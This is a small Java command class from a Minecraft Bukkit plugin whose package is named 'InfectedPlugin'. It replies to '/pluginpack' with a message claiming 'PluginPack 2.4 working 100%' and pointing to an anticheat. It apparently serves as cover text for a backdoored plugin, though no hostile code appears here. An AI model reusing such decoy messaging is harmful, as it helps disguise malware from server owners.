package org.CreeperCoders.InfectedPlugin.SlashCommands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Commandpluginpack extends IPCommand
{
    @Override
    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
        return true;
    }
}
